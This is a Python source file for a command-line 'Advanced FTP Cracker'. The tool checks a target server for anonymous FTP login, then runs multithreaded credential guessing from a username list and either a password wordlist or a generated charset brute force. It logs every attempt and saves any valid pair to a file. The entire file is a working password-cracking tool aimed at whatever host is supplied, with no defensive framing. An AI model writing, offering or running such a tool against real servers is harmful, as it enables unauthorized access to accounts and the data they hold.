import ftplib
import threading
import queue
import argparse
import itertools
import string
from colorama import Fore, init
from datetime import datetime

init()

# === Log Writer ===
def log(message):
    with open("log.txt", "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# === Anonymous Login Checker ===
def check_anonymous_login(host, port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login()
        print(f"{Fore.GREEN}[+] Anonymous login allowed!{Fore.RESET}")
        log("Anonymous login allowed!")
        ftp.quit()
    except Exception:
        print(f"{Fore.YELLOW}[!] Anonymous login NOT allowed.{Fore.RESET}")
        log("Anonymous login NOT allowed.")

# === FTP Connect Attempt ===
def connect_ftp(host, port, user, password, found_flag):
    if found_flag["found"]:
        return
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        print(f"{Fore.GREEN}[+] Found: {user}:{password}{Fore.RESET}")
        log(f"FOUND: {user}:{password}")
        with open("found.txt", "w") as f:
            f.write(f"{user}:{password}")
        found_flag["found"] = True
        ftp.quit()
    except ftplib.error_perm:
        print(f"{Fore.RED}[-] Wrong: {user}:{password}{Fore.RESET}")
        log(f"Wrong: {user}:{password}")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Error: {e}{Fore.RESET}")
        log(f"Error: {user}:{password} → {e}")

# === Worker Thread ===
def worker(q, host, port, found_flag):
    while not q.empty() and not found_flag["found"]:
        user, password = q.get()
        connect_ftp(host, port, user, password, found_flag)
        q.task_done()

# === Password Generator ===
def generate_passwords(charset, max_len):
    for length in range(1, max_len + 1):
        for pwd in itertools.product(charset, repeat=length):
            yield ''.join(pwd)

# === Main ===
def main():
    parser = argparse.ArgumentParser(description="Advanced FTP Cracker")
    parser.add_argument("--host", required=True, help="Target IP or domain")
    parser.add_argument("--port", type=int, default=21, help="FTP port")
    parser.add_argument("--userlist", required=True, help="File with usernames")
    parser.add_argument("--wordlist", help="File with passwords")
    parser.add_argument("--generate", action="store_true", help="Enable password generator")
    parser.add_argument("--charset", default=string.ascii_lowercase, help="Charset for password generation")
    parser.add_argument("--max-length", type=int, default=3, help="Max password length for generation")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    parser.add_argument("--check-anon", action="store_true", help="Check for anonymous login")

    args = parser.parse_args()

    if args.check_anon:
        check_anonymous_login(args.host, args.port)

    # Load usernames
    with open(args.userlist, "r") as f:
        users = f.read().splitlines()

    # Load or generate passwords
    if args.generate:
        passwords = generate_passwords(args.charset, args.max_length)
    elif args.wordlist:
        with open(args.wordlist, "r") as f:
            passwords = f.read().splitlines()
    else:
        print(f"{Fore.RED}[!] You must use either --wordlist or --generate{Fore.RESET}")
        return

    # Queue all combinations
    q = queue.Queue()
    for user in users:
        for pwd in passwords:
            q.put((user, pwd))

    found_flag = {"found": False}

    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(q, args.host, args.port, found_flag), daemon=True)
        t.start()

    q.join()
    if not found_flag["found"]:
        print(f"{Fore.YELLOW}[!] No valid credentials found.{Fore.RESET}")
        log("No valid credentials found.")

if __name__ == "__main__":
    main()
